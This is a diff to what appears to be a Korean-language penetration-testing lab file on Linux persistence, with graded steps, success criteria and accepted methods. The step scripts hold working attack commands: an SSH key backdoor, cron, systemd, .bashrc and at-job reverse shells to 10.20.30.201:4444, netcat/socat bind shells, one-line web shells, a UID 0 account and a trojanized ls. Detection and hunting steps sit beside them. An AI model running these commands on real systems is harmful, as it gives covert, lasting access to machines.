@@ -33,20 +33,20 @@ steps:
     expect: backdoor successful
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: SSH 키 백도어 설치 — ed25519 키쌍 생성 후 authorized_keys 에 공개키 추가, 비밀번호 변경과 무관한 지속 접근 확보 (MITRE T1098.004)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - ssh-keygen -t ed25519 로 키쌍 생성
+      - ssh + cat >> ~/.ssh/authorized_keys 로 대상 서버 추가
+      - ssh -i <key> 접속 후 backdoor successful 메시지 또는 whoami 성공 확인
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - ssh-keygen + ssh + cat 파이프 조합
+      - ssh-copy-id <user>@<target> (pw 있을 때)
+      - authorized_keys 에 command="/bin/bash" 옵션 추가
+      - drop a trojan key via webshell
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - 키 생성만 하고 대상 서버 추가 없음
+      - authorized_keys 권한(600) 설정 누락
+      - 접속 확인 단계 없음
   target_vm: attacker
   script: 'ssh-keygen -t ed25519 -f /tmp/backdoor_key -N '''' -q && ssh ccc@10.20.30.80 ''mkdir -p ~/.ssh
     && chmod 700 ~/.ssh'' 2>/dev/null && cat /tmp/backdoor_key.pub | ssh ccc@10.20.30.80 ''cat >> ~/.ssh/authorized_keys
@@ -73,20 +73,21 @@ steps:
     expect: Cron backdoor payload
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: cron 기반 리버스 셸 persistence — 5분마다 /bin/bash -c bash /dev/tcp 연결 시도하는 crontab 엔트리 작성 (실행 X,
+        파일만) — MITRE T1053.003
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - '*/5 * * * * 형식 crontab 엔트리 생성'
+      - bash reverse shell payload 문자열 포함
+      - 'Cron backdoor payload: 라벨 + 내용 출력'
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo + 파일 리다이렉트
+      - crontab -e (편집 후 저장)
+      - /etc/cron.d/ 에 직접 파일 drop
+      - (crontab -l; echo <line>) | crontab -
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - cron 포맷 잘못 (필드 수 미일치)
+      - reverse shell 구문 누락
+      - T1053.003 언급 없음
   target_vm: attacker
   script: echo '# Cron-based reverse shell persistence' && echo '*/5 * * * * /bin/bash -c "bash -i >&
     /dev/tcp/10.20.30.201/4444 0>&1" 2>/dev/null' > /tmp/cron_backdoor.txt && echo 'Cron backdoor payload:'
@@ -136,20 +137,21 @@ steps:
     expect: Systemd backdoor
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: systemd .service 백도어 파일 작성 — [Unit]/[Service]/[Install] 섹션으로 Restart=always 자동 재시작, multi-user.target
+        부팅 시 실행 (파일만)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - heredoc 으로 /tmp/backdoor.service 생성
+      - ExecStart 에 bash reverse shell 문자열 + Restart=always
+      - WantedBy=multi-user.target 포함 + systemctl list-unit-files 로 탐지 가능 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - cat > <file> << EOF ... EOF
+      - echo -e 다줄 리다이렉트
+      - python 으로 systemd unit 생성
+      - Ansible/Puppet 으로 대량 배포 예시
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - 섹션 누락 (Unit 없음 등)
+      - Restart 옵션 없음
+      - WantedBy 누락으로 부팅 시 미동작
   target_vm: attacker
   script: 'cat > /tmp/backdoor.service << ''EOF''
 
@@ -197,20 +199,20 @@ steps:
     expect: 'Payload:'
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: .bashrc 에 reverse shell 호출 라인 추가 (시뮬만) — 사용자 셸 시작마다 nohup + & 로 백그라운드 연결 시도
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - <SENSITIVE:e3b156d546cef760>
+      - 'Payload: 라벨과 함께 내용 출력'
+      - FIM(File Integrity Monitoring)으로 탐지 가능 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo >> ~/.bashrc 추가 (실제 수정 X, 시뮬용)
+      - .profile, .zshrc, .bash_profile 에도 유사 주입
+      - /etc/profile.d/ 에 시스템 전체 백도어
+      - trap EXIT 로 로그아웃 시 실행
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - nohup 없이 foreground (사용자 눈치챔)
+      - $() 치환 없이 정적 문자열만
+      - FIM 탐지 맥락 없음
   target_vm: attacker
   script: echo '# .bashrc persistence payload (simulation only)' && echo 'echo "nohup bash -i >& /dev/tcp/10.20.30.201/4444
     0>&1 &" >> ~/.bashrc' > /tmp/bashrc_backdoor.txt && echo 'Payload:' && cat /tmp/bashrc_backdoor.txt
@@ -233,20 +235,21 @@ steps:
     expect: update.sh
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: /tmp/.hidden_backdoor 숨겨진 디렉터리 생성 — 점(.)으로 시작하는 경로는 기본 ls 에 미표시, tmpfs(/tmp, /dev/shm, /var/tmp)
+        자주 악용
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - ssh 로 mkdir -p /tmp/.hidden_backdoor 후 스크립트 파일(update.sh) 배치
+      - chmod +x 로 실행 권한 부여
+      - ls -la /tmp/.hidden_backdoor/ 로 내용 확인 (업데이트.sh 존재)
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - ssh + mkdir + echo + chmod
+      - scp 로 기존 스크립트 업로드
+      - 웹쉘 → mkdir + wget
+      - /dev/shm 대체 (더 은밀, 재부팅시 소실)
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - 일반 디렉터리(점 없는) 생성
+      - 스크립트 없이 빈 디렉터리만
+      - find 기반 탐지법 언급 없음
   target_vm: attacker
   script: ssh ccc@10.20.30.80 'mkdir -p /tmp/.hidden_backdoor && echo "#!/bin/bash" > /tmp/.hidden_backdoor/update.sh
     && echo "# Simulated backdoor script" >> /tmp/.hidden_backdoor/update.sh && chmod +x /tmp/.hidden_backdoor/update.sh
@@ -269,20 +272,20 @@ steps:
     expect: pam
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: /etc/pam.d/sshd 와 common-auth 등 PAM 설정 조회 — PAM 백도어(특정 비번으로 모든 계정 로그인) 원리 이해
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - ssh + cat /etc/pam.d/sshd + cat /etc/pam.d/common-auth 실행
+      - 출력에 pam_unix.so 또는 auth required/sufficient 라인
+      - pam_unix 수정 또는 커스텀 PAM 모듈 삽입의 은밀성 언급 + debsums 탐지
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - ssh + cat /etc/pam.d/*
+      - find /lib/x86_64-linux-gnu/security -name pam_*
+      - debsums -c libpam-modules (무결성 검사)
+      - strace -e openat sshd (로딩된 모듈)
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - PAM 파일 조회 없이 개념만
+      - pam_unix 언급 없음
+      - debsums 탐지 언급 없음
   target_vm: attacker
   script: ssh ccc@10.20.30.80 'cat /etc/pam.d/sshd 2>/dev/null; echo ---; cat /etc/pam.d/common-auth 2>/dev/null'
     2>/dev/null | head -30
@@ -304,20 +307,21 @@ steps:
     expect: LD_PRELOAD hook
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: LD_PRELOAD 공유라이브러리 후킹 시연 — C 로 constructor 함수 작성·gcc -shared -fPIC 컴파일·LD_PRELOAD=<so> 실행해
+        시스템 함수 후킹 원리
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - /tmp/hook.c 작성 + gcc -shared -fPIC -o /tmp/hook.so 컴파일
+      - LD_PRELOAD=/tmp/hook.so id 실행
+      - 출력에 LD_PRELOAD hook 키워드 (constructor 실행 증명) + PID 값
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - __attribute__((constructor)) void init() { ... } 사용
+      - dlsym() 로 원 함수 호출
+      - /etc/ld.so.preload 에 등록 (모든 프로세스 영향)
+      - Frida 동적 후킹 대체
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - -shared -fPIC 없이 컴파일 실패
+      - LD_PRELOAD 설정 없이 실행
+      - ld.so.preload 탐지 맥락 없음
   target_vm: attacker
   script: "echo '#include <stdio.h>\n#include <unistd.h>\n__attribute__((constructor)) void init() {\n\
     \    printf(\"[LD_PRELOAD hook executed] PID=%d\\n\", getpid());\n}' > /tmp/hook.c && gcc -shared\
@@ -343,20 +347,21 @@ steps:
     expect: Detection
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: UID 0 백도어 계정 생성 시뮬 — useradd -o -u 0 또는 /etc/passwd 직접 추가로 root 동등 권한 계정 (awk UID==0 탐지
+        언급)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - 3가지 방법(useradd/passwd edit/shadow edit) 명령 출력
+      - 'grep x:0: /etc/passwd 로 기존 UID 0 확인'
+      - 'Detection: awk -F: $3==0 /etc/passwd 탐지 언급'
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
+      - echo backdoor:x:0:0::/root:/bin/bash >> /etc/passwd
+      - openssl passwd -6 로 해시 생성 후 shadow 추가
+      - sudoers 에 NOPASSWD ALL 대신 UID 0 방식
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - UID 0 설명 없이 일반 계정 생성
+      - 탐지 방법 언급 없음
+      - awk 탐지 스크립트 누락
   target_vm: attacker
   script: 'echo ''# Backdoor user account (simulation)'' && echo ''Method 1: useradd -o -u 0 -g 0 -M -d
     /root -s /bin/bash backdoor'' && echo ''Method 2: echo "backdoor:x:0:0::/root:/bin/bash" >> /etc/passwd''
@@ -382,20 +387,20 @@ steps:
     expect: Bind Shell Backdoors
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Bind Shell 백도어 명령 제시 — Netcat/Socat/Python 3종 구현 (포트 5555 LISTEN, 리버스 셸과 반대 방향)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - Netcat(nc -lvnp 5555 -e /bin/bash), Socat, Python 3종 명령 출력
+      - === Bind Shell Backdoors === 헤더와 각 구현 라벨
+      - 리버스 셸 vs 바인드 셸 차이(방화벽 영향) 설명 + ss LISTEN 탐지 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo 로 각 명령 문자열 출력
+      - 실제 nohup nc -lvnp 5555 -e /bin/bash & 실행
+      - socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash
+      - python socket.bind + accept + subprocess
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - 구현 1종만
+      - 리버스 vs 바인드 차이 설명 없음
+      - ss LISTEN 탐지 언급 없음
   target_vm: attacker
   script: 'echo ''=== Bind Shell Backdoors ==='' && echo ''Netcat: nohup nc -lvnp 5555 -e /bin/bash &''
     && echo ''Socat: nohup socat TCP-LISTEN:5555,reuseaddr,fork EXEC:/bin/bash &'' && echo ''Python: nohup
@@ -422,20 +427,20 @@ steps:
     expect: Web Shell Examples
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: PHP/JSP/Python 웹쉘 예시 — 각 언어의 한 줄 웹쉘 코드 + 배치 경로(웹 루트) + 사용법(?cmd=id) + 탐지(FIM·WAF)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - === Web Shell Examples === 헤더와 PHP/JSP/Python 3종 예시
+      - curl <url>/?cmd=id 사용법 제시
+      - find /var/www -newer 로 최근 수정 탐지 또는 FIM 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - echo 로 3종 언어 웹쉘 예시
+      - 파일 저장 후 cat (PHP webshell)
+      - weevely generate 로 obfuscated 웹쉘
+      - c99/r57 공개 웹쉘 사용
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - 1개 언어만
+      - 배치 경로/사용법 누락
+      - 탐지 방법 누락
   target_vm: attacker
   script: 'echo ''=== Web Shell Examples ==='' && echo ''PHP: <?php system(\$_GET["cmd"]); ?>'' > /tmp/webshell_example.php
     && echo ''JSP: <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'' && echo ''Python: import
@@ -461,20 +466,20 @@ steps:
     expect: '---'
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: at 명령 시간 기반 일회성 백도어 — cron 과 달리 단일 실행, atq 로 대기 확인 가능하지만 종종 포렌식에서 간과됨
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - echo <cmd> | at now + N minute 로 예약
+      - atq 로 예약 확인 (job id 와 시간)
+      - at 과 cron 차이(일회성 vs 반복) + atq 탐지 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - at now + 5 minutes 로 bash reverse shell 예약
+      - at -f <script> now + 1 hour
+      - at -t YYYYMMDDHHMM
+      - /var/spool/at/ 직접 조작
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - at 대신 cron 사용
+      - atq 확인 없이 예약만
+      - 탐지 방법 언급 없음
   target_vm: attacker
   script: 'echo ''echo backdoor_executed > /tmp/at_test'' | at now + 1 minute 2>/dev/null; atq 2>/dev/null;
     echo ''---''; echo ''at-based persistence: echo "bash -i >& /dev/tcp/10.20.30.201/4444 0>&1" | at
@@ -499,20 +504,21 @@ steps:
     expect: '---'
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: /etc/ssh/sshd_config 에서 PermitRootLogin·AuthorizedKeysFile·Port 설정 조회 — 백도어 지속성 경로 확인 (FIM
+        감시 필요)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - ssh + grep -E 로 4개 주요 옵션 추출
+      - 각 옵션의 백도어 활용 가능성 해석
+      - AuthorizedKeysFile 경로 변경의 은밀성 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - grep -E PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile|Port /etc/ssh/sshd_config
+      - sshd -T (현재 유효 설정)
+      - python 으로 파일 파싱
+      - AIDE 로 sshd_config 변경 감시
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - 전체 파일 cat (필터 없음)
+      - 옵션 해석 없이 raw 출력
+      - FIM 맥락 언급 없음
   target_vm: attacker
   script: ssh ccc@10.20.30.80 'grep -E "(PermitRootLogin|PasswordAuthentication|AuthorizedKeysFile|Port)"
     /etc/ssh/sshd_config' 2>/dev/null && echo '---' && echo 'Persistence via sshd_config:' && echo '1.
@@ -539,20 +545,20 @@ steps:
     expect: Detection
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 시스템 바이너리 트로이목마 — ls/ps/netstat 원본 백업 후 래퍼 스크립트로 교체해 숨겨진 파일·프로세스 은닉 (루트킷 기본)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - /tmp/trojan_ls.sh 작성 — /usr/bin/ls.orig 호출 + grep -v backdoor 필터
+      - 설치 3단계(cp 원본 백업 / mv 래퍼 / chmod) 명시
+      - debsums/rpm -Va/AIDE 탐지 방법 언급
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - bash 래퍼 스크립트 작성
+      - LD_PRELOAD 로 readdir 후킹 (대안)
+      - rootkit 도구(Chkrootkit/rkhunter) 탐지
+      - 패키지 무결성 검사
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - 원본 백업 단계 누락
+      - 탐지 도구 언급 없음
+      - 래퍼 로직(grep -v) 없음
   target_vm: attacker
   script: 'echo ''#!/bin/bash'' > /tmp/trojan_ls.sh && echo ''# Trojanized ls - hides .backdoor files''
     >> /tmp/trojan_ls.sh && echo ''/usr/bin/ls.orig "$@" | grep -v backdoor'' >> /tmp/trojan_ls.sh &&
@@ -580,20 +586,20 @@ steps:
     expect: Persistence Hunt
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: 지속성 헌팅 종합 스크립트 — SSH 키·cron·systemd·숨겨진 파일·SUID·at queue 6 벡터를 하나의 SSH 명령으로 일괄 검사
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - ssh + bash 내부에서 6개 이상 섹션 검사 ([SSH Keys]/[Cron]/[Systemd]/[Hidden /tmp]/[SUID]/[at queue])
+      - 각 섹션에 계산 로직(wc -l 또는 find)
+      - Persistence Hunt 헤더 출력
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - ssh + 원라이너 bash script
+      - 별도 hunt.sh 파일 배포 후 실행
+      - OSSEC rootcheck
+      - Wazuh FIM + rootkit detection
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - 섹션 3개 이하
+      - Persistence Hunt 헤더 없음
+      - 계산 결과 해석 없음
   target_vm: attacker
   script: ssh ccc@10.20.30.80 'echo "=== Persistence Hunt ==="; echo "[SSH Keys]"; wc -l ~/.ssh/authorized_keys
     2>/dev/null; echo "[Cron]"; crontab -l 2>/dev/null | wc -l; echo "[Systemd]"; ls /etc/systemd/system/*.service
@@ -621,20 +627,21 @@ steps:
     expect: Persistence Report
     field: stdout
     semantic:
-      intent: 지속성 확보 (Persistence) 주제의 실습 스텝 — 해당 기법의 공격 명령 실행 또는 원리 실증
+      intent: Persistence 리포트 — 사용 기법에 MITRE ATT&CK ID(T1098.004/T1053.003/T1543.002/T1546.004/T1564.001/T1505.003/T1136.001)
+        매핑 + 탐지 방법(FIM/Cron audit/Network/Process)
       success_criteria:
-      - instruction 의 핵심 공격 기법 실행 또는 PoC 구성
-      - 대상 VM 에 대한 결과 확인 (출력·응답·로그)
-      - 해당 기법의 MITRE ATT&CK 기법 또는 CVE·도구 최소 1개 언급
+      - '[Techniques Used] 섹션에 최소 5개 기법 + 각 T-ID'
+      - '[Detection Methods] 섹션에 FIM/Cron audit/Network monitoring 등 4개 이상'
+      - 파일 저장 후 cat 확인
       acceptable_methods:
-      - <SENSITIVE:623a50469317aead>
-      - 수동 payload 구성 (curl·python·netcat)
-      - Burp Repeater / ffuf / wfuzz 등 웹 퍼저
-      - defensor 관점에서 탐지 지표 제시도 인정
+      - heredoc > /tmp/persistence_report.txt
+      - echo -e 다줄
+      - MITRE ATT&CK Navigator JSON export
+      - Sigma 룰로 탐지 매핑
       negative_signs:
-      - 실행 없이 개념 설명만
-      - 대상 VM·결과 누락
-      - 해당 주제(지속성 확보 (Persistence))와 무관한 기법
+      - T-ID 없이 기법 이름만
+      - 탐지 방법 없음
+      - 기법 3개 이하
   target_vm: attacker
   script: 'echo -e ''=== Persistence Report ===\n\n[Techniques Used]\n1. SSH Authorized Keys (T1098.004)
     - authorized_keys에 공개키 추가\n2. Cron Job (T1053.003) - 리버스 셸 cron 등록\n3. Systemd Service (T1543.002)
